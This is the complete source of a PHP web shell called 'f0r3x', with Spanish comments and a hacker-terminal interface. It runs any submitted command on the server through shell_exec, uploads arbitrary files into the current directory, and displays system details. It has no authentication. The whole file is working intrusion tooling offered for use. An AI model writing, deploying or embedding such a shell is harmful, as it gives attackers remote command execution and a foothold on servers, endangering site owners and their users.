<?php
session_start();

if (!isset($_SESSION['current_dir'])) { $_SESSION['current_dir'] = getcwd(); }
if (!isset($_SESSION['history'])) { $_SESSION['history'] = ""; }

$current_dir = $_SESSION['current_dir'];
$msg = "";

// --- LÓGICA DE SUBIDA DE ARCHIVOS ---
if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
    $target_path = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['file_upload']['name']);
    
    // Verificar si tenemos permisos de escritura en la carpeta actual
    if (!is_writable($current_dir)) {
        $msg = "<div style='color: #f85149; padding:10px; border:1px solid #f85149; margin-bottom:10px;'>[!] ERROR: No tienes permisos de escritura en esta carpeta. Prueba a darle: chmod 777 " . htmlspecialchars($current_dir) . "</div>";
    } else {
        if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $target_path)) {
            $msg = "<div style='color: #2ea043; padding:10px; border:1px solid #2ea043; margin-bottom:10px;'>[+] ARCHIVO SUBIDO: " . htmlspecialchars($_FILES['file_upload']['name']) . "</div>";
        } else {
            $msg = "<div style='color: #f85149; padding:10px; border:1px solid #f85149; margin-bottom:10px;'>[!] ERROR DESCONOCIDO al mover el archivo.</div>";
        }
    }
} elseif (isset($_FILES['file_upload'])) {
    $msg = "<div style='color: #f85149; padding:10px;'>[!] ERROR PHP Code: " . $_FILES['file_upload']['error'] . "</div>";
}

// --- LÓGICA DE COMANDOS ---
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['command'])) {
    $command = trim($_POST["command"]);
    if (!empty($command)) {
        if ($command === 'clear') {
            $_SESSION['history'] = '';
        } elseif (preg_match('/^cd\s+(.+)/', $command, $matches)) {
            $target = trim($matches[1]);
            $newDir = ($target[0] === '/') ? $target : $current_dir . DIRECTORY_SEPARATOR . $target;
            if (is_dir($newDir) && chdir($newDir)) {
                $_SESSION['current_dir'] = realpath($newDir);
                $current_dir = $_SESSION['current_dir'];
            }
        } else {
            chdir($current_dir);
            $output = shell_exec($command . ' 2>&1');
            $_SESSION['history'] .= "<div class='entry'><span style='color:#2ea043'>f0r3x@kali</span>:<span style='color:#58a6ff'>".htmlspecialchars($current_dir)."</span>$ ".htmlspecialchars($command)."\n<span class='out'>".htmlspecialchars($output)."</span></div>";
        }
    }
}

// Obtener IP Local
$local_ip = exec("hostname -I | awk '{print $1}'") ?: $_SERVER['SERVER_ADDR'];
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>f0r3x</title>
    <style>
        :root { --main-bg: #0d1117; --side-bg: #161b22; --accent: #2ea043; --text: #c9d1d9; --border: #30363d; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--main-bg); color: var(--text); font-family: 'Consolas', monospace; height: 100vh; display: flex; overflow: hidden; }

        .sidebar { width: 280px; background: var(--side-bg); border-right: 1px solid var(--border); padding: 25px; display: flex; flex-direction: column; gap: 10px; }
        .logo { font-size: 1.5rem; font-weight: 900; color: var(--accent); margin-bottom: 15px; }
        .stat-card { background: rgba(13, 17, 23, 0.6); padding: 10px; border-radius: 6px; border: 1px solid var(--border); font-size: 12px; margin-bottom: 5px; }
        .stat-card span { color: #8b949e; font-size: 10px; font-weight: bold; display: block; text-transform: uppercase; }

        .upload-box { margin-top: 15px; padding: 15px; border: 1px dashed var(--border); border-radius: 8px; }
        .up-btn { width: 100%; padding: 8px; background: var(--accent); border: none; color: white; border-radius: 4px; cursor: pointer; margin-top: 10px; font-weight: bold; }

        .main-content { flex: 1; display: flex; flex-direction: column; height: 100%; position: relative; }
        .terminal { flex: 1; overflow-y: scroll; padding: 30px; font-size: 14px; display: flex; flex-direction: column; }
        .entry { margin-bottom: 15px; white-space: pre-wrap; }
        .out { color: #e6edf3; display: block; margin-top: 5px; padding-left: 10px; border-left: 1px solid var(--border); }

        .input-bar { background: var(--side-bg); border-top: 1px solid var(--border); padding: 15px 25px; display: flex; align-items: center; min-height: 60px; }
        .path { color: #58a6ff; font-weight: bold; margin-right: 10px; }
        .cmd-input { flex: 1; background: transparent; border: none; color: #fff; outline: none; font-family: inherit; font-size: 15px; }
    </style>
</head>
<body>

<div class="sidebar">
    <div class="logo">f0r3x</div>
    <div class="stat-card"><span>SISTEMA</span><?php echo php_uname('s'); ?></div>
    <div class="stat-card"><span>IP LOCAL</span><?php echo $local_ip; ?></div>
    <div class="stat-card"><span>PHP</span><?php echo PHP_VERSION; ?></div>

    <div class="upload-box">
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file_upload" style="font-size: 11px; width: 100%;">
            <button type="submit" class="up-btn">SUBIR ARCHIVO</button>
        </form>
    </div>
    <button onclick="location.reload()" style="margin-top:auto; padding:8px; background:transparent; border:1px solid var(--border); color:var(--text); border-radius:5px; cursor:pointer;">REFRESH</button>
</div>

<div class="main-content">
    <div class="terminal" id="term">
        <?php echo $msg; ?>
        <?php echo $_SESSION['history']; ?>
    </div>

    <form method="POST" class="input-bar" onsubmit="saveScroll()">
        <span class="path"><?php echo htmlspecialchars($current_dir); ?></span>
        <span style="color:var(--accent); margin-right:10px;">&gt;</span>
        <input type="text" name="command" id="cmd" class="cmd-input" autofocus autocomplete="off">
    </form>
</div>

<script>
    const term = document.getElementById('term');
    const cmd = document.getElementById('cmd');

    // Recuperar y aplicar scroll
    window.onload = function() {
        const scrolled = localStorage.getItem('termScroll');
        if (scrolled) {
            term.scrollTop = scrolled;
        } else {
            term.scrollTop = term.scrollHeight;
        }
        localStorage.removeItem('termScroll');
        cmd.focus();
    };

    function saveScroll() {
        localStorage.setItem('termScroll', term.scrollTop);
    }

    // Mantener foco
    document.addEventListener('click', () => cmd.focus());
</script>

</body>
</html>
